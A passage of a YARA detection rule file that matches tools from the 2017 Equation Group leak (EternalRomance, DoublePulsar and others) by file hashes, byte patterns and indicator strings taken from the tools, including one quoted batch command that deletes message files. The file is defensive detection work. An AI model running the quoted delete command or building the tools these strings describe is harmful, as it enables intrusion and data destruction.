\"48251fb89c510fb3efa14c4b5b546fbde918ed8bb25f041a801e3874bd4f60f8\"\n      hash2 = \"237c22f4d43fdacfcbd6e1b5f1c71578279b7b06ea8e512b4b6b50f10e8ccf10\"\n      hash3 = \"79a584c127ac6a5e96f02a9c5288043ceb7445de2840b608fc99b55cf86507ed\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] Failed to Prepare Payload!\" fullword ascii\n      $x2 = \"ShellcodeStartOffset\" fullword ascii\n      $x3 = \"[*] Waiting for AuthCode from exploit\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Explodingcantouch_1_2_1_RID3AA6 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:55:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0cdde7472b077610d0068aa7e9035da89fe5d435549749707cae24495c8d8444\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] Connection closed by remote host (TCP Ack/Fin)\" fullword ascii\n      $s2 = \"[!]Warning: Error on first request - path size may actually be larger than indicated.\" fullword ascii\n      $s4 = \"<http://%s/%s> (Not <locktoken:write1>) <http://%s/>\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Architouch_1_0_0_RID37AE : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:48:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"444979a2387530c8fbbc5ddb075b15d6a4717c3435859955f37ebc0f40a4addc\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[+] Target is %s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Erraticgopher_1_0_1_RID38F4 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:43:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3d11fe89ffa14f267391bc539e6808d600e465955ddb854201a1f31a9ded4052\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] Error appending shellcode buffer\" fullword ascii\n      $x2 = \"[-] Shellcode is too big\" fullword ascii\n      $x3 = \"[+] Exploit Payload Sent!\" fullword ascii\n      $x4 = \"[+] Bound to Dimsvc, sending exploit request to opnum 29\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Esteemaudit_2_1_0_RID3820 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:07:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"61f98b12c52739647326e219a1cf99b5440ca56db3b6177ea9db4e3b853c6ea6\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] Connected to target %s:%d\" fullword ascii\n      $x2 = \"[-] build_exploit_run_x64():\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Darkpulsar_1_1_0_RID37BE : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:51:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b439ed18262aec387984184e86bfdb31ca501172b1c066398f8c56d128ba855a\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[%s] - Error upgraded DLL architecture does not match target architecture (0x%x)\" fullword ascii\n      $x2 = \"[%s] - Error building DLL loading shellcode\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Educatedscholar_1_0_0_RID39AF : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:14:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4cce9e39c376f67c16df3bcd69efd9b7472c3b478e2e5ef347e1410f1105c38d\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] Shellcode Callback %s:%d\" fullword ascii\n      $x2 = \"[+] Exploiting Target\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Doublepulsar_1_3_1_RID389A : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:28:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"15ffbb8d382cd2ff7b0bd4c87a7c0bffd1541c2fe86865af445123bc0b770d13\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] Ping returned Target architecture: %s - XOR Key: 0x%08X\" fullword ascii\n      $x2 = \"[.] Sending shellcode to inject DLL\" fullword ascii\n      $x3 = \"[-] Error setting ShellcodeFile name\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Erraticgophertouch_1_0_1_RID3B17 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 20:14:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"729eacf20fe71bd74e57a6b829b45113c5d45003933118b53835779f0b049bad\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] Unable to connect to broswer named pipe, target is NOT vulnerable\" fullword ascii\n      $x2 = \"[-] Unable to bind to Dimsvc RPC syntax, target is NOT vulnerable\" fullword ascii\n      $x3 = \"[+] Bound to Dimsvc, target IS vulnerable\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Smbtouch_1_1_1_RID36EB : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:16:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"108243f61c53f00f8f1adcf67c387a8833f1a2149f063dd9ef29205c90a3c30a\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] Target is vulnerable to %d exploit%s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Educatedscholartouch_1_0_0_RID3BD2 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 20:45:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f4b958a0d3bb52cb34f18ea293d43fa301ceadb4a259d3503db912d0a9a1e4d8\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[!] A vulnerable target will not respond.\" fullword ascii\n      $x2 = \"[-] Target NOT Vulernable\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Esteemaudittouch_2_1_0_RID3A43 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:39:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f6b9caf503bb664b22c6d39c87620cc17bdb66cef4ccfa48c31f2a3ae13b4281\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] Touching the target failed!\" fullword ascii\n      $x2 = \"[-] OS fingerprint not complete - 0x%08x!\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Rpctouch_2_1_0_RID36EE : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:16:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7fe4c3cedfc98a3e994ca60579f91b8b88bf5ae8cf669baa0928508642c5a887\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[*] Failed to detect OS / Service Pack on %s:%d\" fullword ascii\n      $x2 = \"[*] SMB String: %s (%s)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Mofconfig_1_0_0_RID373C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:29:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c67a24fe2380331a101d27d6e69b82d968ccbae54a89a2629b6c135436d7bdb2\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] Get RemoteMOFTriggerPath error\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Easypi_Explodingcan_RID399C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:11:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"dc1ddad7e8801b5e37748ec40531a105ba359654ffe8bdb069bd29fb0b5afd94\"\n      hash2 = \"97af543cf1fb59d21ba5ec6cb2f88c8c79c835f19c8f659057d2f58c321a0ad4\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] %s - Target might not be in a usable state.\" fullword ascii\n      $x2 = \"[*] Exploiting Target\" fullword ascii\n      $x3 = \"[-] Encoding Exploit Payload failed!\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Eclipsedwingtouch_1_0_4_RID3AA9 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:56:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"46da99d80fc3eae5d1d5ab2da02ed7e61416e1eafeb23f37b180c46e9eff8a1c\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] The target is NOT vulnerable\" fullword ascii\n      $x2 = \"[+] The target IS VULNERABLE\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Iistouch_1_2_2_RID36F0 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:17:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c433507d393a8aa270576790acb3e995e22f4ded886eb9377116012e247a07c6\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] Are you being redirectect? Need to retarget?\" fullword ascii\n      $x2 = \"[+] IIS Target OS: %s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 60KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Namedpipetouch_2_0_0_RID395B : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:00:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cb5849fcbc473c7df886828d225293ffbd8ee58e221d03b840fd212baeda6e89\"\n      hash2 = \"043d1c9aae6be65f06ab6f0b923e173a96b536cf84e57bfd7eeb9034cd1df8ea\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[*] Summary: %d pipes found\" fullword ascii\n      $s3 = \"[+] Testing %d pipes\" fullword ascii\n      $s6 = \"[-] Error on SMB startup, aborting\" fullword ascii\n      $s12 = \"92a761c29b946aa458876ff78375e0e28bc8acb0\" fullword ascii\n      $op1 = { 68 10 10 40 00 56 e8 e1 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and 2 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Easybee_1_0_1_RID3663 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:53:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"59c17d6cb564edd32c770cd56b5026e4797cf9169ff549735021053268b31611\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"@@for /f \\\"delims=\\\" %%i in ('findstr /smc:\\\"%s\\\" *.msg') do if not \\\"%%MsgFile1%%\\\"==\\\"%%i\\\" del /f \\\"%%i\\\"\" fullword ascii\n      $x2 = \"Logging out of WebAdmin (as target account)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Regread_1_1_1_RID3660 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:53:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"722f034ba634f45c429c7dafdbff413c08976b069a6b30ec91bfa5ce2e4cda26\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[+] Connected to the Registry Service\" fullword ascii\n      $s2 = \"f08d49ac41d1023d9d462d58af51414daff95a6a\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Englishmansdentist_1_2_0_RID3B1A : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 20:14:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2a6ab28885ad7d5d64ac4c4fb8c619eca3b7fb3be883fc67c90f3ea9251f34c6\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] CheckCredentials(): Checking to see if valid username/password\" fullword ascii\n      $x2 = \"Error connecting to target, TbMakeSocket() %s:%d.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Architouch_Eternalsynergy_Smbtouch_RID3FDF : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 23:38:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"444979a2387530c8fbbc5ddb075b15d6a4717c3435859955f37ebc0f40a4addc\"\n      hash2 = \"92c6a9e648bfd98bbceea3813ce96c6861487826d6b2c3d462debae73ed25b34\"\n      hash3 = \"108243f61c53f00f8f1adcf67c387a8833f1a2149f063dd9ef29205c90a3c30a\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"NtErrorMoreProcessingRequired\" fullword ascii\n      $s2 = \"Command Format Error: Error=%x\" fullword ascii\n      $s3 = \"NtErrorPasswordRestriction\" fullword ascii\n      $op0 = { 8a 85 58 ff ff ff 88 43 4d } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 2 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Eternalromance_2_RID3837 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:11:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f1ae9fdbb660aae3421fd3e5b626c1e537d8e9ee2f9cd6d56cb70b6878eaca5d\"\n      hash2 = \"b99c3cc1acbb085c9a895a8c3510f6daaf31f0d2d9ccb8477c7fb7119376f57b\"\n      hash3 = \"92c6a9e648bfd98bbceea3813ce96c6861487826d6b2c3d462debae73ed25b34\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] Backdoor shellcode written\" fullword ascii\n      $x2 = \"[*] Attempting exploit method %d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17__Emphasismine_RID3738 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:29:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"dcaf91bd4af7cc7d1fb24b5292be4e99c7adf4147892f6b3b909d1d84dd4e45b\"\n      hash2 = \"348eb0a6592fcf9da816f4f7fc134bcae1b61c880d7574f4e19398c4ea467f26\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Error: Could not calloc() for shellcode buffer\" fullword ascii\n      $x2 = \"shellcodeSize: 0x%04X + 0x%04X + 0x%04X = 0x%04X\" fullword ascii\n      $x3 = \"Generating shellcode\" fullword ascii\n      $x4 = \"([0-9a-zA-Z]+) OK LOGOUT completed\" fullword ascii\n      $x5 = \"Error: Domino is not the expected version. (%s, %s)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Eternalromance_RID37A6 : APT DEMO EXE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:47:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f1ae9fdbb660aae3421fd3e5b626c1e537d8e9ee2f9cd6d56cb70b6878eaca5d\"\n      hash2 = \"b99c3cc1acbb085c9a895a8c3510f6daaf31f0d2d9ccb8477c7fb7119376f57b\"\n      tags = \"APT, DEMO, EXE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] Error: Exploit choice not supported for target OS!!\" fullword ascii\n      $x2 = \"Error: Target machine out of NPP memory (VERY BAD!!) - Backdoor removed\" fullword ascii\n      $x3 = \"[-] Error: Backdoor not present on target\" fullword ascii\n      $x4 = \"***********    TARGET ARCHITECTURE IS X64    ************\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them ) or 2 of them\n}\n\nrule EquationGroup_Toolset_Apr17_Gen4_RID3344 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 14:40:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fe7ce2fdb245c62e4183c728bc97e966a98fdc8ffd795ed09da23f96e85dcdcd\"\n      hash2 = \"0989bfe351342a7a1150b676b5fd5cbdbc201b66abcb23137b1c4de77a8f61a6\"\n      hash3 = \"270850303e662be53d90fa60a9e5f4bd2bfb95f92a046c77278257631d9addf4\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] \\\"TargetPort\\\"      %hu\" fullword ascii\n      $x2 = \"---<<<  Complete  >>>---\" fullword ascii\n      $x3 = \"[+] \\\"NetworkTimeout\\\"  %hu\" fullword ascii\n      $op1 = { 46 83 c4 0c 83 fe 0c 0f 8c 5e ff ff ff b8 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and ( 1 of ( $x* ) or 2 of them ) )\n}\n\nrule EquationGroup_Toolset_Apr17_Gen1_RID3341 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 14:40:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1b5b33931eb29733a42d18d8ee85b5cd7d53e81892ff3e60e2e97f3d0b184d31\"\n      hash2 = \"139697168e4f0a2cc73105205c0ddc90c357df38d93dbade761392184df680c7\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Restart with the new protocol, address, and port as target.\" fullword ascii\n      $x2 = \"TargetPort      : %s (%u)\" fullword ascii\n      $x3 = \"Error: strchr() could not find '@' in account name.\" fullword ascii\n      $x4 = \"TargetAcctPwd   : %s\" fullword ascii\n      $x5 = \"Creating CURL connection handle...\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 1 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_Gen2_RID3342 : APT DEMO EXE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 14:40:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7fe425cd040608132d4f4ab2671e04b340a102a20c97ffdcf1b75be43a9369b5\"\n      hash2 = \"561c0d4fc6e0ff0a78613d238c96aed4226fbb7bb9ceea1d19bc770207a6be1e\"\n      hash3 = \"f2e90e04ddd05fa5f9b2fec024cd07365aebc098593d636038ebc2720700662b\"\n      tags = \"APT, DEMO, EXE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[+] Setting password : (NULL)\" fullword ascii\n      $s2 = \"[-] TbBuffCpy() failed!\" fullword ascii\n      $s3 = \"[+] SMB negotiation\" fullword ascii\n      $s4 = \"12345678-1234-ABCD-EF00-0123456789AB\" fullword ascii\n      $s5 = \"Value must end with 0000 (2 NULLs)\" fullword ascii\n      $s6 = \"[*] Configuring Payload\" fullword ascii\n      $s7 = \"[*] Connecting to listener\" fullword ascii\n      $op1 = { b0 42 40 00 89 44 24 30 c7 44 24 34 } \n      $op2 = { eb 59 8b 4c 24 10 68 1c 46 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 1 of ( $s* ) and 1 of ( $op* ) ) or 3 of them\n}\n\nrule EquationGroup_Toolset_Apr17_Gen3_RID3343 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 14:40:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"270850303e662be53d90fa60a9e5f4bd2bfb95f92a046c77278257631d9addf4\"\n      hash2 = \"7a086c0acb6df1fa304c20733f96e898d21ca787661270f919329fadfb930a6e\"\n      hash3 = \"c236e0d9c5764f223bd3d99f55bd36528dfc0415e14f5fde1e5cdcada14f4ec0\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Logon failed.  Kerberos ticket not yet valid (target and KDC times not synchronized)\" fullword ascii\n      $s2 = \"[-] Could not set \\\"CredentialType\\\"\" fullword ascii\n      $op1 = { 46 83 c4 0c 83 fe 0c 0f 8c 5e ff ff ff b8 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them )\n}\n\nrule EquationGroup_Toolset_Apr17_yak_RID333B : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 14:39:01\"\n      